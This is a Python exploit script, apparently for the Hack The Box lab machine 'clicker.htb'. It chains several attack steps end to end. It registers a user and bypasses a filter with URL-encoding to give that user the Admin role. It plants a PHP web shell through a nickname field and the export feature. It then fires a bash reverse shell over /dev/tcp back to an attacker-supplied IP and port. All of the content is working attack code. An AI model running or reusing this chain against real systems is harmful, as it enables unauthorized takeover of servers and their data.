import requests
import sys
import subprocess

url = "http://clicker.htb"
username = 'sakura'
password = 'password'

def createUser():
    global session
    session = requests.session()
    session.proxies.update({'http': 'http://127.0.0.1:8080'}) # debug
    session.get(url + '/index.php')

    body = {
        'username': username,
        'password': password
    }
    session.post(f'{url}/create_player.php', data=body)
    session.post(f'{url}/authenticate.php', data=body)

def bypassFilter():
    param = 'role='
    payload = ''.join([f'%{hex(ord(c))[2:]}' for c in param]) + "'Admin'%23"
    
    # using request won't work with the payload
    params = '?level=100&clicks=100&' + payload
    subprocess.call(["curl",
                     "-v", 
                     "--cookie", f"PHPSESSID={session.cookies['PHPSESSID']}",
                     f"{url}/save_game.php{params}"
                     ], 
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.STDOUT)
 
def web_shell():
    payload = f'<?php system($_GET["cmd"]);?>'
    
    params = {
        'level': 100,
        'clicks': 100,
        'nickname': payload
    }
    session.get(f"{url}/save_game.php", params=params)

    body = {
        'extension': 'php'
    }
    r = session.post(f'{url}/export.php', data=body, allow_redirects=False)
    path = ''.join(r.headers['Location'].split('saved in ')[1:])
    return path

def rev_shell(path):
    payload = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    params = {
        'cmd': payload
    }
    session.get(f'{url}/{path}', params=params)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("[!] Usage: python3 rev-shell.py <ip> <port>")

    global ip, port
    ip = sys.argv[1]
    port = sys.argv[2]

    createUser()
    bypassFilter()  # gain admin role
    path = web_shell()
    print(f"[*] Creds: {username}:{password}")
    print(f"[*] Web-Shell: {path}")
    rev_shell(path)
    
